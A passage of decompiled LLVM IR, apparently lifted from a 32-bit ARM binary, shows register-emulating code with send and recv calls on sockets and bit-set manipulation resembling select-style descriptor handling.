  %v2_97f4 = inttoptr i32 %v2_97f0 to i8*
  %v3_97f4 = call i32 @function_139c4(i8* %v2_97f4, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_97fc = call i32 @function_13074(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9804 = call i32 @function_1399c(i8* %v1_9698)
  %v0_9808 = load i32, i32* @r5, align 4
  store i32 %v0_9808, i32* %r1.global-to-local, align 4
  store i32 %v2_9804, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_9814 = inttoptr i32 %v0_9808 to i32*
  %v3_9814 = call i32 @function_12f90(i32 34, i32* %v2_9814)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_9814, i32* %r1.global-to-local, align 4
  %v1_9820 = load i32, i32* @r4, align 4
  %v2_9820 = add i32 %v1_9820, %stack_var_-20856.0.ph
  store i32 %v2_9820, i32* @r0, align 4
  %v2_9824 = inttoptr i32 %v2_9820 to i8*
  %v3_9824 = call i32 @function_139c4(i8* %v2_9824, i32 %v3_9814)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_982c = call i32 @function_12fbc(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9834 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_9840 = add i32 %v2_9834, %stack_var_-20856.0.ph
  store i32 %v2_9840, i32* @r0, align 4
  %v2_9844 = inttoptr i32 %v2_9840 to i8*
  %v3_9844 = call i32 @function_139c4(i8* %v2_9844, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 %v3_9844, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v1_984c = load i32, i32* @r5, align 4
  %v2_984c = sub i32 %v6_8f58, %v1_984c
  %v3_984c = icmp uge i32 %v6_8f58, %v1_984c
  store i1 %v3_984c, i1* %cpsr_c.global-to-local, align 1
  %v4_984c = xor i32 %v1_984c, %v6_8f58
  %v5_984c = xor i32 %v2_984c, %v6_8f58
  %v6_984c = and i32 %v5_984c, %v4_984c
  %v7_984c = icmp slt i32 %v6_984c, 0
  store i1 %v7_984c, i1* %cpsr_v.global-to-local, align 1
  %v8_984c = icmp slt i32 %v2_984c, 0
  store i1 %v8_984c, i1* %cpsr_n.global-to-local, align 1
  %v9_984c = icmp eq i32 %v6_8f58, %v1_984c
  store i1 %v9_984c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_984c, label %dec_label_pc_9924, label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9664
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9858 = call i32 @function_13074(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9860 = call i32 @function_1399c(i8* %v1_9698)
  %v0_9864 = load i32, i32* @r5, align 4
  store i32 %v0_9864, i32* %r1.global-to-local, align 4
  store i32 %v2_9860, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_9870 = inttoptr i32 %v0_9864 to i32*
  %v3_9870 = call i32 @function_12f90(i32 35, i32* %v2_9870)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_9870, i32* %r1.global-to-local, align 4
  %v1_987c = load i32, i32* @r4, align 4
  %v2_987c = add i32 %v1_987c, %stack_var_-20856.0.ph
  store i32 %v2_987c, i32* @r0, align 4
  %v2_9880 = inttoptr i32 %v2_987c to i8*
  %v3_9880 = call i32 @function_139c4(i8* %v2_9880, i32 %v3_9870)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9888 = call i32 @function_12fbc(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9890 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_989c = add i32 %v2_9890, %stack_var_-20856.0.ph
  store i32 %v2_989c, i32* @r0, align 4
  %v2_98a0 = inttoptr i32 %v2_989c to i8*
  %v3_98a0 = call i32 @function_139c4(i8* %v2_98a0, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98a8 = call i32 @function_1399c(i8* %v1_9698)
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* %r1.global-to-local, align 4
  store i32 %v2_98a8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_98b8 = inttoptr i32 %v0_98ac to i32*
  %v3_98b8 = call i32 @function_12f90(i32 40, i32* %v2_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_98b8, i32* %r1.global-to-local, align 4
  %v2_98c4 = add i32 %v2_98a8, %stack_var_-20856.0.ph
  store i32 %v2_98c4, i32* @r0, align 4
  %v2_98c8 = inttoptr i32 %v2_98c4 to i8*
  %v3_98c8 = call i32 @function_139c4(i8* %v2_98c8, i32 %v3_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_142f4.82 to i32), i32* %r1.global-to-local, align 4
  %v2_98dc = add i32 %v2_98d0, %stack_var_-20856.0.ph
  store i32 %v2_98dc, i32* @r0, align 4
  %v2_98e0 = inttoptr i32 %v2_98dc to i8*
  %v3_98e0 = call i32 @function_139c4(i8* %v2_98e0, i32 ptrtoint (i32* @global_var_142f4.82 to i32))
  store i32 %v6_8f58, i32* %r0.global-to-local, align 4
  %v2_98e8 = call i32 @function_1399c(i8* %v1_98e8)
  store i32 %v2_98e8, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98f4 = call i32 @function_1399c(i8* %v1_9698)
  %v2_98fc = add i32 %v2_98f4, %stack_var_-20856.0.ph
  store i32 %v2_98fc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_9904 = load i32, i32* @r4, align 4
  store i32 %v0_9904, i32* %r0.global-to-local, align 4
  %v3_9908 = trunc i32 %v0_9904 to i8
  %v4_9908 = call i32 @function_13e90(i8 %v3_9908, i32 10, i32 %v2_98fc)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9910 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_991c = add i32 %v2_9910, %stack_var_-20856.0.ph
  store i32 %v2_991c, i32* @r0, align 4
  %v2_9920 = inttoptr i32 %v2_991c to i8*
  %v3_9920 = call i32 @function_139c4(i8* %v2_9920, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 %v3_9920, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_9664, %dec_label_pc_9854
  %v0_9924 = load i32, i32* @r6, align 4
  %v1_9924 = add i32 %v0_9924, 37
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  %v3_9924 = load i32, i32* %v2_9924, align 4
  store i32 %v3_9924, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9928 = icmp slt i32 %v3_9924, 0
  store i1 %v1_9928, i1* %cpsr_n.global-to-local, align 1
  %v2_9928 = icmp eq i32 %v3_9924, 0
  store i1 %v2_9928, i1* %cpsr_z.global-to-local, align 1
  %tmp213 = icmp slt i32 %v3_9924, 1
  br i1 %tmp213, label %dec_label_pc_99d0, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9924
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9934 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14304.90 to i32), i32* %r1.global-to-local, align 4
  %v2_9940 = add i32 %v2_9934, %stack_var_-20856.0.ph
  store i32 %v2_9940, i32* @r0, align 4
  %v3_9944 = inttoptr i32 %v2_9940 to i8*
  %v4_9944 = call i32 @function_139c4(i8* %v3_9944, i32 ptrtoint ([9 x i8]* @global_var_14304.90 to i32))
  store i32 %v4_9944, i32* %r0.global-to-local, align 4
  %v0_9948 = load i32, i32* @r6, align 4
  %v1_9948 = add i32 %v0_9948, 37
  %v2_9948 = inttoptr i32 %v1_9948 to i32*
  %v3_9948 = load i32, i32* %v2_9948, align 4
  store i32 %v3_9948, i32* %r3.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9950 = icmp slt i32 %v3_9948, 0
  store i1 %v1_9950, i1* %cpsr_n.global-to-local, align 1
  %v2_9950 = icmp eq i32 %v3_9948, 0
  store i1 %v2_9950, i1* %cpsr_z.global-to-local, align 1
  %v0_9954 = load i32, i32* @r5, align 4
  store i32 %v0_9954, i32* %stack_var_-40, align 4
  %tmp214 = icmp slt i32 %v3_9948, 1
  br i1 %tmp214, label %dec_label_pc_99b8, label %dec_label_pc_995c

dec_label_pc_995c:                                ; preds = %dec_label_pc_9930, %dec_label_pc_995c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9960 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_9968 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_9970 = and i32 %v3_9968, 33554432
  %v2_9970 = icmp ne i32 %v1_9970, 0
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  %v3_9970 = mul i32 %v3_9968, 128
  %v1_9974 = add i32 %v3_9970, 1472
  %v2_9978 = add i32 %v2_9960, %stack_var_-20856.0.ph
  store i32 %v2_9978, i32* @r0, align 4
  %v0_997c = load i32, i32* @r7, align 4
  %v2_997c = add i32 %v1_9974, %v0_997c
  store i32 %v2_997c, i32* %r1.global-to-local, align 4
  %v2_9980 = inttoptr i32 %v2_9978 to i8*
  %v3_9980 = call i32 @function_139c4(i8* %v2_9980, i32 %v2_997c)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9988 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14310.92 to i32), i32* %r1.global-to-local, align 4
  %v2_9994 = add i32 %v2_9988, %stack_var_-20856.0.ph
  store i32 %v2_9994, i32* @r0, align 4
  %v3_9998 = inttoptr i32 %v2_9994 to i8*
  %v4_9998 = call i32 @function_139c4(i8* %v3_9998, i32 ptrtoint ([3 x i8]* @global_var_14310.92 to i32))
  store i32 %v4_9998, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_99a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_99a0, i32* %r3.global-to-local, align 4
  %v0_99a4 = load i32, i32* @r6, align 4
  %v1_99a4 = add i32 %v0_99a4, 37
  %v2_99a4 = inttoptr i32 %v1_99a4 to i32*
  %v3_99a4 = load i32, i32* %v2_99a4, align 4
  store i32 %v3_99a4, i32* %r2.global-to-local, align 4
  %v1_99a8 = add i32 %v3_99a0, 1
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v2_99ac = sub i32 %v3_99a4, %v1_99a8
  %v3_99ac = icmp uge i32 %v3_99a4, %v1_99a8
  store i1 %v3_99ac, i1* %cpsr_c.global-to-local, align 1
  %v4_99ac = xor i32 %v3_99a4, %v1_99a8
  %v5_99ac = xor i32 %v2_99ac, %v3_99a4
  %v6_99ac = and i32 %v5_99ac, %v4_99ac
  %v7_99ac = icmp slt i32 %v6_99ac, 0
  store i1 %v7_99ac, i1* %cpsr_v.global-to-local, align 1
  %v8_99ac = icmp slt i32 %v2_99ac, 0
  store i1 %v8_99ac, i1* %cpsr_n.global-to-local, align 1
  %v9_99ac = icmp eq i32 %v3_99a4, %v1_99a8
  store i1 %v9_99ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_99a8, i32* %stack_var_-40, align 4
  %v8_99b4 = icmp sgt i32 %v3_99a4, %v1_99a8
  br i1 %v8_99b4, label %dec_label_pc_995c, label %dec_label_pc_99b8

dec_label_pc_99b8:                                ; preds = %dec_label_pc_995c, %dec_label_pc_9930
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99bc = call i32 @function_1399c(i8* %v1_9698)
  %v2_99c4 = add i32 %v2_99bc, %stack_var_-20856.0.ph
  store i32 %v2_99c4, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_99cc = inttoptr i32 %v2_99c4 to i8*
  %v3_99cc = call i32 @function_139c4(i8* %v2_99cc, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_9924, %dec_label_pc_99b8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99d4 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_99e0 = add i32 %v2_99d4, %stack_var_-20856.0.ph
  store i32 %v2_99e0, i32* @r0, align 4
  %v2_99e4 = inttoptr i32 %v2_99e0 to i8*
  %v3_99e4 = call i32 @function_139c4(i8* %v2_99e4, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 %v3_99e4, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_99ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_99ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99ec, label %dec_label_pc_9a0c, label %dec_label_pc_99f4

dec_label_pc_99f4:                                ; preds = %dec_label_pc_99d0
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99f8 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v2_9a04 = add i32 %v2_99f8, %stack_var_-20856.0.ph
  store i32 %v2_9a04, i32* @r0, align 4
  %v2_9a08 = inttoptr i32 %v2_9a04 to i8*
  %v3_9a08 = call i32 @function_139c4(i8* %v2_9a08, i32 %v6_8f58)
  store i32 %v3_9a08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_99d0, %dec_label_pc_99f4
  %v0_9a0c = load i32, i32* @r7, align 4
  %v1_9a0c = add i32 %v0_9a0c, 1440
  store i32 %v1_9a0c, i32* %r4.global-to-local, align 4
  %v0_9a10 = load i32, i32* @r6, align 4
  store i32 %v0_9a10, i32* %r0.global-to-local, align 4
  store i32 %v1_9a0c, i32* %r1.global-to-local, align 4
  %v2_9a18 = inttoptr i32 %v0_9a10 to i8*
  %v3_9a18 = call i32 @function_13d7c(i8* %v2_9a18, i32 %v1_9a0c)
  store i32 %v3_9a18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a1c = icmp slt i32 %v3_9a18, 0
  store i1 %v1_9a1c, i1* %cpsr_n.global-to-local, align 1
  %v2_9a1c = icmp eq i32 %v3_9a18, 0
  store i1 %v2_9a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a1c, label %dec_label_pc_a364, label %dec_label_pc_9a24

dec_label_pc_9a24:                                ; preds = %dec_label_pc_9a0c, %dec_label_pc_a364
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r6, align 4
  %v1_9a28 = add i32 %v0_9a28, -1431
  %v2_9a28 = inttoptr i32 %v1_9a28 to i32*
  %v3_9a28 = load i32, i32* %v2_9a28, align 4
  store i32 %v3_9a28, i32* @r4, align 4
  %v2_9a2c = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_9a2c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9a3c = load i32, i32* @r4, align 4
  store i32 %v0_9a3c, i32* %r0.global-to-local, align 4
  %v5_9a40 = call i32 @send(i32 %v0_9a3c, i32* %v4_9a40, i32 %v2_9a2c, i32 16384)
  store i32 %v5_9a40, i32* %r0.global-to-local, align 4
  %v0_9a44 = load i32, i32* @r6, align 4
  %v1_9a44 = add i32 %v0_9a44, -1431
  %v2_9a44 = inttoptr i32 %v1_9a44 to i32*
  %v3_9a44 = load i32, i32* %v2_9a44, align 4
  store i32 %v3_9a44, i32* %r0.global-to-local, align 4
  %v3_9a4c = udiv i32 %v3_9a44, 32
  %v3_9a50 = mul nuw nsw i32 %v3_9a4c, 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9a58 = add i32 %v3_9a50, %v2_94a0
  store i32 %v2_9a58, i32* %r3.global-to-local, align 4
  %v1_9a5c = add i32 %v2_9a58, -164
  %v2_9a5c = inttoptr i32 %v1_9a5c to i32*
  %v3_9a5c = load i32, i32* %v2_9a5c, align 4
  %v1_9a60 = urem i32 %v3_9a44, 32
  %v1_9a64 = load i32, i32* %fp.global-to-local, align 4
  %v7_9a64 = shl i32 %v1_9a64, %v1_9a60
  %v8_9a64 = or i32 %v7_9a64, %v3_9a5c
  store i32 %v8_9a64, i32* %r2.global-to-local, align 4
  %v0_9a68 = load i32, i32* @sl, align 4
  %v2_9a68 = sub i32 %v0_9a68, %v3_9a44
  %v3_9a68 = icmp uge i32 %v0_9a68, %v3_9a44
  store i1 %v3_9a68, i1* %cpsr_c.global-to-local, align 1
  %v4_9a68 = xor i32 %v0_9a68, %v3_9a44
  %v5_9a68 = xor i32 %v2_9a68, %v0_9a68
  %v6_9a68 = and i32 %v5_9a68, %v4_9a68
  %v7_9a68 = icmp slt i32 %v6_9a68, 0
  store i1 %v7_9a68, i1* %cpsr_v.global-to-local, align 1
  %v8_9a68 = icmp slt i32 %v2_9a68, 0
  store i1 %v8_9a68, i1* %cpsr_n.global-to-local, align 1
  %v9_9a68 = icmp eq i32 %v0_9a68, %v3_9a44
  store i1 %v9_9a68, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_9a64, i32* %v2_9a5c, align 4
  %v0_9a74 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a74 = load i32, i32* @r6, align 4
  %v2_9a74 = add i32 %v1_9a74, -1419
  %v3_9a74 = inttoptr i32 %v2_9a74 to i32*
  store i32 %v0_9a74, i32* %v3_9a74, align 4
  %v0_9a78 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a78 = trunc i32 %v0_9a78 to i8
  %v2_9a78 = load i32, i32* @r6, align 4
  %v3_9a78 = add i32 %v2_9a78, -1427
  %v4_9a78 = inttoptr i32 %v3_9a78 to i8*
  store i8 %v1_9a78, i8* %v4_9a78, align 1
  %v0_9a7c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_9a7c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_9a7c = xor i1 %v0_9a7c, %v1_9a7c
  br i1 %v2_9a7c, label %dec_label_pc_9a80, label %dec_label_pc_9388

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a24
  %v0_9a80 = load i32, i32* %r0.global-to-local, align 4
  %v1_9a80 = add i32 %v0_9a80, 1
  store i32 %v1_9a80, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9360
  %v1_9a88 = add i32 %v3_9658, -1431
  %v2_9a88 = inttoptr i32 %v1_9a88 to i32*
  %v3_9a88 = load i32, i32* %v2_9a88, align 4
  store i32 %v3_9a88, i32* %r0.global-to-local, align 4
  %v3_9a90 = udiv i32 %v3_9a88, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9a94 = mul nuw nsw i32 %v3_9a90, 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_9a9c = add i32 %v3_9a94, %v2_94a0
  store i32 %v2_9a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %.thread25, %.thread36, %dec_label_pc_9a88
  %v1_9aac = phi i32 [ %v4_9344, %.thread36 ], [ %v4_9324, %.thread25 ], [ %v3_9a88, %dec_label_pc_9a88 ]
  %v1_9ab0 = phi i32 [ %v3_9358, %.thread36 ], [ %v3_9338, %.thread25 ], [ %v2_9a9c, %dec_label_pc_9a88 ]
  %v1_9aa0 = add i32 %v1_9ab0, -164
  %v2_9aa0 = inttoptr i32 %v1_9aa0 to i32*
  %v3_9aa0 = load i32, i32* %v2_9aa0, align 4
  %v1_9aa4 = urem i32 %v1_9aac, 32
  store i32 %v1_9aa4, i32* %r1.global-to-local, align 4
  %v1_9aa8 = load i32, i32* %fp.global-to-local, align 4
  %v7_9aa8 = shl i32 %v1_9aa8, %v1_9aa4
  %v8_9aa8 = or i32 %v7_9aa8, %v3_9aa0
  store i32 %v8_9aa8, i32* %r2.global-to-local, align 4
  %v0_9aac = load i32, i32* @sl, align 4
  %v2_9aac = sub i32 %v0_9aac, %v1_9aac
  %v3_9aac = icmp uge i32 %v0_9aac, %v1_9aac
  store i1 %v3_9aac, i1* %cpsr_c.global-to-local, align 1
  %v4_9aac = xor i32 %v0_9aac, %v1_9aac
  %v5_9aac = xor i32 %v2_9aac, %v0_9aac
  %v6_9aac = and i32 %v5_9aac, %v4_9aac
  %v7_9aac = icmp slt i32 %v6_9aac, 0
  store i1 %v7_9aac, i1* %cpsr_v.global-to-local, align 1
  %v8_9aac = icmp slt i32 %v2_9aac, 0
  store i1 %v8_9aac, i1* %cpsr_n.global-to-local, align 1
  %v9_9aac = icmp eq i32 %v0_9aac, %v1_9aac
  store i1 %v9_9aac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9aa8, i32* %v2_9aa0, align 4
  %v2_9ab4 = xor i1 %v8_9aac, %v7_9aac
  br i1 %v2_9ab4, label %dec_label_pc_9ab8, label %dec_label_pc_9388

dec_label_pc_9ab8:                                ; preds = %dec_label_pc_9aa0
  %v0_9ab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_9ab8 = add i32 %v0_9ab8, 1
  store i32 %v1_9ab8, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9310
  %v1_9ac0 = add i32 %v3_9658, -1423
  %v2_9ac0 = inttoptr i32 %v1_9ac0 to i32*
  %v3_9ac0 = load i32, i32* %v2_9ac0, align 4
  %v1_9ac4 = load i32, i32* %sb.global-to-local, align 4
  %v2_9ac4 = sub i32 %v1_9ac4, %v3_9ac0
  store i32 %v2_9ac4, i32* %r3.global-to-local, align 4
  %v1_9ac8 = add i32 %v2_9ac4, -30
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 29
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ac8 = sub i32 29, %v2_9ac4
  %v4_9ac8 = and i32 %v3_9ac8, %v2_9ac4
  %v5_9ac8 = icmp slt i32 %v4_9ac8, 0
  store i1 %v5_9ac8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ac8 = icmp slt i32 %v1_9ac8, 0
  store i1 %v6_9ac8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 30
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v2_9acc = xor i1 %v7_9ac8, true
  %v3_9acc = and i1 %v2_9ac8, %v2_9acc
  br i1 %v3_9acc, label %dec_label_pc_9370, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ac0
  %v1_9ad0 = add i32 %v3_9658, -1431
  %v2_9ad0 = inttoptr i32 %v1_9ad0 to i32*
  %v3_9ad0 = load i32, i32* %v2_9ad0, align 4
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v3_9ad8 = udiv i32 %v3_9ad0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9adc = mul nuw nsw i32 %v3_9ad8, 4
  store i32 %v3_9adc, i32* %r3.global-to-local, align 4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_9b28:                                ; preds = %dec_label_pc_9574
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9b30 = call i32 @function_13a3c(i32 %v2_8fd8, i32 10240)
  store i32 %v2_9b30, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9b3c = load i32, i32* @r8, align 4
  %v1_9b3c = add i32 %v0_9b3c, -1456
  %v2_9b3c = inttoptr i32 %v1_9b3c to i32*
  %v3_9b3c = load i32, i32* %v2_9b3c, align 4
  store i32 %v3_9b3c, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9b48 = call i32 @_recv(i32 %v3_9b3c, i32 %v2_8fd8, i32 10240, i32 16386)
  store i32 %v4_9b48, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b50 = icmp slt i32 %v4_9b48, 0
  store i1 %v1_9b50, i1* %cpsr_n.global-to-local, align 1
  %v2_9b50 = icmp eq i32 %v4_9b48, 0
  store i1 %v2_9b50, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp215 = icmp slt i32 %v4_9b48, 1
  br i1 %tmp215, label %dec_label_pc_a7d4, label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b28
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9b6c = call i32 @function_13a60(i32 %v2_8fd8, i32 %v4_9b48, i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), i32 4)
  store i32 %v5_9b6c, i32* %r0.global-to-local, align 4
  %v1_9b70 = add i32 %v5_9b6c, 1
  %v2_9b70 = icmp eq i32 %v5_9b6c, -1
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v3_9b70 = sub i32 0, %v5_9b6c
  %v4_9b70 = and i32 %v1_9b70, %v3_9b70
  %v5_9b70 = icmp slt i32 %v4_9b70, 0
  store i1 %v5_9b70, i1* %cpsr_v.global-to-local, align 1
  %v6_9b70 = icmp slt i32 %v1_9b70, 0
  store i1 %v6_9b70, i1* %cpsr_n.global-to-local, align 1
  %v7_9b70 = icmp eq i32 %v1_9b70, 0
  store i1 %v7_9b70, i1* %cpsr_z.global-to-local, align 1
  %v0_a66c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_9b70, label %dec_label_pc_a66c, label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %dec_label_pc_9b5c, %dec_label_pc_a66c
  store i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_a66c, i32* %r1.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_9b88 = call i32 @function_13a60(i32 %v2_8fd8, i32 %v0_a66c, i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), i32 4)
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_9b94 = add i32 %v5_9b88, %v2_94a0
  store i32 %v2_9b94, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_9b9c = load i32, i32* @r6, align 4
  %v4_9b9c = add i32 %v3_9b9c, %v2_9b94
  %v5_9b9c = inttoptr i32 %v4_9b9c to i8*
  store i8 0, i8* %v5_9b9c, align 1
  %v0_9ba0 = load i32, i32* @r5, align 4
